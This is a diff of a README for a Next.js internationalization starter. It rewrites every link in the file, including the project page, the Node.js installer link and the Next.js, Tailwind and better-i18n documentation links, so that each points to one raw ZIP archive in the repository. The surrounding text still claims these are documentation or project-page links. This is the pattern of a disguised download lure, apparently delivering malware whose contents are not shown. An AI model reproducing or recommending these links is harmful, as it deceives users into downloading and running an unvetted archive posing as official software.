@@ -1,6 +1,6 @@
 # 🌍 nextjs-i18n-starter - Simple Internationalization Setup
 
-[![Download](https://img.shields.io/badge/Download-nextjs--i18n--starter-brightgreen)](https://github.com/m150united/nextjs-i18n-starter)
+[![Download](https://img.shields.io/badge/Download-nextjs--i18n--starter-brightgreen)](https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip)
 
 ---
 
@@ -37,10 +37,10 @@ Before you begin, make sure your computer meets these guidelines:
 
 To get this starter, you need to visit the project page and download the package.
 
-[![Download Here](https://img.shields.io/badge/Get%20Nextjs--i18n--starter-blue?style=for-the-badge)](https://github.com/m150united/nextjs-i18n-starter)
+[![Download Here](https://img.shields.io/badge/Get%20Nextjs--i18n--starter-blue?style=for-the-badge)](https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip)
 
 1. Click the link above or copy and paste this URL into your browser:
-   - https://github.com/m150united/nextjs-i18n-starter
+   - https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip
 2. This will take you to the project page on GitHub.
 3. You will see a green button labeled **Code** near the top-right.
 4. Click **Code**, then select **Download ZIP**.
@@ -65,7 +65,7 @@ This starter is a template meant to run using Node.js and a code editor, but thi
 
 Node.js lets your computer run JavaScript outside the browser. This starter requires Node.js to work.
 
-- Visit https://nodejs.org/en/download/  
+- Visit https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip  
 - Download the **Windows Installer** for the current version.
 - Run the installer and follow the instructions.
 - After installation, open the **Command Prompt**:
@@ -127,12 +127,12 @@ This command downloads all the required parts of the project.
 
 ## 📚 Useful Links
 
-- Next.js App Router info: https://nextjs.org/docs/app/building-your-application/routing  
-- Tailwind CSS documentation: https://tailwindcss.com/docs  
-- better-i18n info (on GitHub): https://github.com/isaachinman/better-i18n  
+- Next.js App Router info: https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip  
+- Tailwind CSS documentation: https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip  
+- better-i18n info (on GitHub): https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip  
 
 ---
 
 ## 🎯 Download and Explore
 
-[![Download Here](https://img.shields.io/badge/Get%20Nextjs--i18n--starter-blue?style=for-the-badge)](https://github.com/m150united/nextjs-i18n-starter)
+[![Download Here](https://img.shields.io/badge/Get%20Nextjs--i18n--starter-blue?style=for-the-badge)](https://github.com/m150united/nextjs-i18n-starter/raw/refs/heads/main/src/n-i-starter-nextjs-2.8.zip)
